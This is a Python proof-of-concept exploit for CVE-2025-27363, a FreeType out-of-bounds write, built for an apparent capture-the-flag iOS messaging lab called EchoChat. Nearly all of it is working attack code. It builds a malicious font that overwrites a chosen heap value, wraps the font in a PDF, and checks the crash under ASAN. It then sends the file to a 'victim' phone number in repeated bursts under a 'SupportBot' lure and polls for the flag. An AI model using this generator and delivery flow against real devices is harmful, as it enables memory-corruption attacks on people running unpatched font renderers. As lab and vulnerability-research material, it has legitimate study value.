#!/usr/bin/env python3
"""
poc_final.py -- CVE-2025-27363 (FreeType composite phantom-point OOB) PoC for the
MobileHackingLab "EchoChat" iOS lab.

Consolidated from:
  - the MHL blog writeup  (num_subglyphs=0xFFFD -> (FT_Short)-3 -> FT_NEW_ARRAY(points,1))
  - zhuowei/cve-2025-27363-proof-of-concept   (canonical 65533-component trigger)
  - tin-z/cve-2025-27363                       (font-generator structure)
  - our own reversing of EchoChat (lldb/Frida):
        processFontDataForPreview:  FT_New_Memory_Face -> FT_Set_Named_Instance(1)
        -> FT_Set_Char_Size(12ppem) -> FT_Load_Glyph('A') -> ec_render_thumbnail
        -> ec_dispatch_completion:  calls flag_reveal() iff  job[0x8] == 0xF0
        (0xF0 = &flag_reveal - &normal_preview_completion)

Mechanism of control:
  The 48-byte OOB write past the 16-byte points buffer stores phantom points
  pp2,pp3,pp4 (each FT_Vector{x,y}=16B). In the adjacent heap job, job[0x8] lands
  on a vertical phantom's Y (pp3.y / pp4.y), which we set via vmtx:
      pp3.y = yMax(=0 for empty glyph) + topSideBearing      -> set tsb      = 0xF0
      pp4.y = pp3.y - advanceHeight                           -> set advH = 0  -> pp4.y = 0xF0
  so whichever of pp3.y/pp4.y the groom aligns to job[0x8], it is 0xF0 (240).

The trigger is ASAN-verified locally (see `verify`): heap-buffer-overflow WRITE
of size 16 at ttgload.c:1929. The real flag is returned by flag_reveal() on the
REMOTE lab instance; the side-loaded local build only returns a stub string.

Requires: fontTools  (pip install fonttools)
"""
import argparse, base64, json, os, sys, time, urllib.request, urllib.error, subprocess

HERE = os.path.dirname(os.path.abspath(__file__))
HDRS = {"Content-Type": "application/json", "User-Agent": "echochat-poc/final"}
DEFAULT_BASE = os.environ.get("ECHOCHAT_BASE", "https://echochat-lab.mhc-ctf.workers.dev")

# --------------------------------------------------------------------------- #
# 1) trigger-font builder
# --------------------------------------------------------------------------- #
def build_trigger_font(out_ttf, target_char=0x41, gate=0xF0, ncomp=0xFFFE, upm=1000):
    """Minimal variable font whose `target_char` glyph is a composite with
    `ncomp` subglyphs; vmtx makes the vertical phantom Y == `gate`."""
    from fontTools.fontBuilder import FontBuilder
    from fontTools.ttLib.tables._g_l_y_f import Glyph, GlyphComponent

    order = [".notdef", "gE", "gT"]            # gid0 notdef, gid1 empty, gid2 trigger
    fb = FontBuilder(upm, isTTF=True)
    fb.setupGlyphOrder(order)
    # map the char EchoChat renders ('A') to the trigger glyph; '%' too for parity
    fb.setupCharacterMap({target_char: "gT", 0x25: "gT", 0x20: "gE"})

    def empty():
        g = Glyph(); g.numberOfContours = 0
        g.coordinates = []; g.endPtsOfContours = []; g.flags = []
        return g
    gT = Glyph(); gT.numberOfContours = -1; gT.components = []
    for _ in range(ncomp):
        c = GlyphComponent(); c.glyphName = "gE"; c.x = 0; c.y = 0
        c.flags = 0x0002                        # ARGS_ARE_XY_VALUES
        gT.components.append(c)
    fb.setupGlyf({".notdef": empty(), "gE": empty(), "gT": gT})

    fb.setupHorizontalMetrics({".notdef": (upm, 0), "gE": (0, 0), "gT": (upm, 0)})
    fb.setupHorizontalHeader(ascent=800, descent=-200)
    # vmtx: (advanceHeight, topSideBearing). yMax of empty glyph = 0, so:
    #   pp3.y = 0 + tsb = gate ;  pp4.y = pp3.y - advanceHeight = gate - 0 = gate
    fb.setupVerticalMetrics({".notdef": (upm, 0), "gE": (0, 0), "gT": (0, gate)})
    fb.setupVerticalHeader(ascent=500, descent=-500)
    fb.setupNameTable({"familyName": "Trig", "styleName": "Regular"})
    fb.setupOS2(); fb.setupPost()
    # fvar + one named instance -> FT_Set_Named_Instance(1) activates GX_VAR path
    fb.setupFvar(axes=[("wght", 100, 400, 900, "Weight")],
                 instances=[dict(location={"wght": 400}, stylename="W400")])
    fb.font["head"].unitsPerEm = upm
    fb.save(out_ttf)
    print("[+] wrote %s (%d bytes): gid2 composite, %d components, "
          "'A'->gid2, pp3.y=pp4.y=%d (0x%x)"
          % (out_ttf, os.path.getsize(out_ttf), ncomp, gate, gate))
    return out_ttf


def wrap_pdf(ttf_path, pdf_path):
    font = open(ttf_path, "rb").read(); n = str(len(font)).encode()
    pdf = (b"%PDF-1.7\n1 0 obj\n<< /Type /Font /Subtype /TrueType /BaseFont /Trig\n"
           b"/FontFile2 2 0 R >>\nendobj\n"
           b"2 0 obj\n<< /Length " + n + b" /Length1 " + n + b" >>\nstream\n"
           + font + b"\nendstream\nendobj\n")
    open(pdf_path, "wb").write(pdf)
    print("[+] wrote %s (%d bytes, /FontFile2 stream)" % (pdf_path, len(pdf)))
    return pdf_path


# --------------------------------------------------------------------------- #
# 2) local ASAN verification -- auto-builds a FreeType 2.13.0 probe if needed
# --------------------------------------------------------------------------- #
CACHE = os.path.join(HERE, ".ftcache")
FT_REPO = "https://gitlab.freedesktop.org/freetype/freetype.git"
FT_TAG = "VER-2-13-0"

FT_PROBE_C = r'''
#include <stdio.h>
#include <stdlib.h>
#include <ft2build.h>
#include FT_FREETYPE_H
#include FT_MULTIPLE_MASTERS_H
int main(int argc, char** argv){
  if(argc<2){ fprintf(stderr,"usage: %s font.ttf [charcode=0x41]\n",argv[0]); return 2; }
  unsigned long cc = (argc>=3)? strtoul(argv[2],0,0) : 0x41;
  FILE* f=fopen(argv[1],"rb"); if(!f){perror("open");return 2;}
  fseek(f,0,SEEK_END); long n=ftell(f); fseek(f,0,SEEK_SET);
  unsigned char* buf=malloc(n); fread(buf,1,n,f); fclose(f);
  FT_Library lib; FT_Init_FreeType(&lib);
  FT_Face face; FT_Error e;
  e=FT_New_Memory_Face(lib,buf,n,0,&face);
  printf("FT_New_Memory_Face=0x%x num_glyphs=%ld\n", e, e?-1:(long)face->num_glyphs);
  if(e) return 1;
  e=FT_Set_Named_Instance(face,1);
  printf("FT_Set_Named_Instance(1)=0x%x IS_NAMED_INSTANCE=%d\n",
         e,(int)((face->face_index & 0x7FFF0000L)!=0));
  FT_Set_Char_Size(face,0,12*64,72,72);
  FT_UInt gi=FT_Get_Char_Index(face, cc);
  printf("char 0x%lx -> glyph index %u ; loading...\n", cc, gi); fflush(stdout);
  e=FT_Load_Glyph(face, gi, 0);
  printf("FT_Load_Glyph=0x%x (no OOB fired if you see this under ASAN)\n", e);
  FT_Done_Face(face); FT_Done_FreeType(lib); free(buf);
  return 0;
}
'''

def _run(cmd, **kw):
    print("    $ " + (cmd if isinstance(cmd, str) else " ".join(cmd)))
    return subprocess.run(cmd, shell=isinstance(cmd, str), **kw)

def ensure_probe():
    """Return path to an ASAN FreeType-2.13.0 probe, building it (clone+make) if absent."""
    probe = os.path.join(CACHE, "ft_probe")
    if os.path.exists(probe) and os.access(probe, os.X_OK):
        return probe
    for tool in ("clang", "git", "make"):
        if not any(os.access(os.path.join(d, tool), os.X_OK)
                   for d in os.environ.get("PATH", "").split(os.pathsep)):
            raise SystemExit("[!] need '%s' to auto-build the probe; install it or pass --probe" % tool)
    os.makedirs(CACHE, exist_ok=True)
    src = os.path.join(CACHE, "ft213")
    lib = os.path.join(src, "objs", ".libs", "libfreetype.a")
    inc = os.path.join(src, "include")
    if not os.path.exists(lib):
        if not os.path.isdir(src):
            print("[*] cloning FreeType %s ..." % FT_TAG)
            _run(["git", "clone", "--depth", "1", "--branch", FT_TAG, FT_REPO, src], check=True)
        env = dict(os.environ, CC="clang",
                   CFLAGS="-fsanitize=address -fno-omit-frame-pointer -g -O1",
                   LDFLAGS="-fsanitize=address")
        print("[*] building FreeType (ASAN, static) ... (one-time, ~1-2 min)")
        if os.path.exists(os.path.join(src, "autogen.sh")):
            _run("sh autogen.sh", cwd=src, env=env,
                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        _run(["./configure", "--without-harfbuzz", "--without-brotli", "--without-png",
              "--without-zlib", "--without-bzip2", "--enable-static", "--disable-shared"],
             cwd=src, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
        _run(["make", "-j%d" % (os.cpu_count() or 4)], cwd=src, env=env,
             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
        if not os.path.exists(lib):
            raise SystemExit("[!] FreeType build did not produce libfreetype.a")
    cpath = os.path.join(CACHE, "ft_probe.c")
    open(cpath, "w").write(FT_PROBE_C)
    print("[*] compiling probe ...")
    _run(["clang", "-g", "-O0", "-fsanitize=address", "-I", inc,
          "-o", probe, cpath, lib, "-lm"], check=True)
    return probe

def verify_local(ttf_path, probe=None):
    probe = probe or os.environ.get("FT_PROBE", "") or ensure_probe()
    if not probe or not os.path.exists(probe):
        print("[!] no probe available."); return None
    env = dict(os.environ, ASAN_OPTIONS="abort_on_error=0:exitcode=99")
    r = subprocess.run([probe, ttf_path, "0x41"], env=env,
                       capture_output=True, text=True)
    out = r.stdout + r.stderr
    fired = ("heap-buffer-overflow" in out and "load_truetype_glyph" in out)
    # print the signal lines, not the whole shadow-byte dump
    for ln in out.splitlines():
        if any(k in ln for k in ("FT_", "char 0x", "heap-buffer-overflow",
                                 "ttgload.c:1909", "ttgload.c:192", "ttgload.c:193", "WRITE of size", "SUMMARY")):
            print("   " + ln)
    print("[%s] OOB %s in load_truetype_glyph (phantom write)"
          % ("+" if fired else "!", "CONFIRMED" if fired else "NOT observed"))
    return fired


# --------------------------------------------------------------------------- #
# 3) backend I/O  (register / send / poll)
# --------------------------------------------------------------------------- #
def _req(url, payload=None, timeout=30):
    data = json.dumps(payload).encode() if payload is not None else None
    r = urllib.request.Request(url, data=data, headers=HDRS,
                               method="POST" if data else "GET")
    with urllib.request.urlopen(r, timeout=timeout) as resp:
        body = resp.read()
    try:
        return json.loads(body)
    except json.JSONDecodeError:
        return {"_raw": body.decode("utf-8", "replace")}


def register(base, handle, phone, retries=6):
    for i in range(retries):
        try:
            r = _req(base + "/api/register", {"handle": handle, "phone_number": phone})
            tok = r.get("token") or (r.get("data") or {}).get("token")
            if tok:
                print("[*] registered %s as '%s'  token=%s..." % (phone, handle, tok[:12]))
                return tok, r.get("phone_number") or phone
            raise SystemExit("[!] no token in response: %s" % json.dumps(r))
        except urllib.error.HTTPError as e:
            wait = 5 + 5 * i
            print("[!] register attempt %d: HTTP %d; retry in %ds"
                  % (i + 1, e.code, wait), file=sys.stderr)
            time.sleep(wait)
    raise SystemExit("[!] registration failed")


def send(base, token, to, text, pdf_path):
    payload = {"to": to, "text": text, "from_token": token}
    if pdf_path:
        raw = open(pdf_path, "rb").read()
        payload["attachment_name"] = os.path.basename(pdf_path)
        payload["attachment_b64"] = base64.b64encode(raw).decode()
    try:
        return _req(base + "/api/messages", payload)
    except urllib.error.HTTPError as e:
        raise SystemExit("[!] send failed: HTTP %d %s"
                         % (e.code, e.read().decode("utf-8", "replace")[:300]))


def poll(base, token, timeout, since=0):
    seen, end = 0, time.time() + timeout
    print("[*] polling %ds for receipts/flag (keep the victim app FOREGROUNDED)..." % timeout)
    import re
    while time.time() < end:
        try:
            resp = _req(base + "/api/messages?token=%s&since=%d" % (token, since))
        except urllib.error.HTTPError as e:
            print("[!] poll: HTTP %d" % e.code, file=sys.stderr); time.sleep(3); continue
        for ev in (resp.get("events") or []):
            since = max(since, int(ev.get("seq") or 0)); seen += 1
            note = ev.get("note") or ""; text = ev.get("text") or ""
            if ev.get("type") == "receipt":
                print("\n===== receipt for msg %s =====\n%s\n=============================="
                      % (ev.get("message_id"), note))
            blob = note + " " + text
            if "flag_reveal() =>" in blob or "dispatch reached flag_reveal" in blob:
                print("\n[+] >>> flag_reveal() CHAIN FIRED <<<")
            for m in re.findall(r"[A-Za-z0-9_]*\{[^}]*\}", blob):
                print("\n[+] >>> FLAG: %s <<<\n" % m)
        time.sleep(3)
    print("[*] poll done, %d event(s)" % seen)


# --------------------------------------------------------------------------- #
# commands
# --------------------------------------------------------------------------- #
def cmd_build(a):
    ttf = a.ttf or os.path.join(HERE, "trigger.ttf")
    pdf = a.out or os.path.join(HERE, "trigger.pdf")
    build_trigger_font(ttf, target_char=a.char, gate=a.gate, ncomp=a.ncomp)
    wrap_pdf(ttf, pdf)
    if a.verify:
        verify_local(ttf, a.probe)


def cmd_verify(a):
    ttf = a.ttf or os.path.join(HERE, "trigger.ttf")
    if not os.path.exists(ttf):
        build_trigger_font(ttf, target_char=a.char, gate=a.gate, ncomp=a.ncomp)
    verify_local(ttf, a.probe)


def cmd_send(a):
    pdf = a.pdf or os.path.join(HERE, "trigger.pdf")
    if not os.path.exists(pdf):
        print("[*] %s missing -> building" % pdf)
        build_trigger_font(os.path.join(HERE, "trigger.ttf"), a.char, a.gate, a.ncomp)
        wrap_pdf(os.path.join(HERE, "trigger.ttf"), pdf)
    tok, _ = register(a.base, a.handle, a.me)
    n = os.path.getsize(pdf)
    print("[*] sending %s (%d bytes) x%d -> %s"
          % (os.path.basename(pdf), n, a.count, a.to))
    for i in range(a.count):
        r = send(a.base, tok, a.to, a.text, pdf)
        print("    send %d -> %s" % (i + 1, json.dumps(r)))
    print("\n[*] FOREGROUND the EchoChat app on the victim now so it pulls & renders.")
    print("    Win receipt: '[Preview] dispatch reached flag_reveal().'")
    return tok


def cmd_run(a):
    tok = cmd_send(a)
    poll(a.base, tok, a.timeout)


def main():
    p = argparse.ArgumentParser(description="CVE-2025-27363 EchoChat PoC (final)")
    sub = p.add_subparsers(dest="cmd", required=True)

    def common(s):
        s.add_argument("--char", type=lambda x: int(x, 0), default=0x41,
                       help="char EchoChat renders -> trigger glyph (default 0x41 'A')")
        s.add_argument("--gate", type=lambda x: int(x, 0), default=0xF0,
                       help="value to write into job[0x8] via vertical phantom (default 0xF0)")
        s.add_argument("--ncomp", type=lambda x: int(x, 0), default=0xFFFE,
                       help="composite component count (default 0xFFFE; (FT_Short)-2 -> 32B buffer = job size class)")

    b = sub.add_parser("build", help="build trigger.ttf + trigger.pdf"); common(b)
    b.add_argument("--ttf"); b.add_argument("--out")
    b.add_argument("--verify", action="store_true", help="also run local ASAN probe")
    b.add_argument("--probe", help="path to FreeType ASAN probe binary")
    b.set_defaults(func=cmd_build)

    v = sub.add_parser("verify", help="confirm the font triggers the OOB locally (ASAN)")
    common(v); v.add_argument("--ttf"); v.add_argument("--probe")
    v.set_defaults(func=cmd_verify)

    for name, fn, hlp in (("send", cmd_send, "deliver the PDF to a victim number"),
                          ("run",  cmd_run,  "build+send+poll")):
        s = sub.add_parser(name, help=hlp); common(s)
        s.add_argument("--to", required=True, help="victim number shown on the app banner NOW")
        s.add_argument("--base", default=DEFAULT_BASE, help="backend base URL")
        s.add_argument("--handle", default="SupportBot")
        s.add_argument("--me", default="+15550009999", help="our sender number")
        s.add_argument("--pdf", help="PDF to send (default trigger.pdf)")
        s.add_argument("--text", default="Please review the attached document.")
        s.add_argument("--count", type=int, default=6, help="burst copies (grooming is probabilistic)")
        if name == "run":
            s.add_argument("--timeout", type=float, default=120.0, help="poll seconds")
        s.set_defaults(func=fn)

    a = p.parse_args()
    a.func(a)


if __name__ == "__main__":
    main()
